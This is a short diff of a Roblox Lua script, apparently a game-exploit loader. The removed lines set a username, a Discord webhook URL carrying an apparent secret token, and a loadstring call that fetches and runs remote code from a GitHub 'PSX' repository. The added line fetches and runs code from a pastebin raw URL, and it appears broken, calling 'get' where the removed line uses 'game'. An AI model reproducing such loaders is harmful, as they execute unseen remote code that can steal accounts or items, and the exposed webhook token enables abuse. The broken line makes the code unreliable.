@@ -1,5 +1,1 @@
-UserName = "CristYanOnRoblox"
-WebHook = "https://discord.com/api/webhooks/1062418410425823323/n7vxTBVM5HH_Qp5Qs1ji36NC19Wfy3IpMAYt_v33SD6crUaHhfTd5gDGY-xCol3n-uKu"
-Mention = true -- change to false if you don't want to get everyone ping in your webhook. 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+loadstring(get:HttpGet("https://pastebin.com/raw/Zde4xXdp"))()
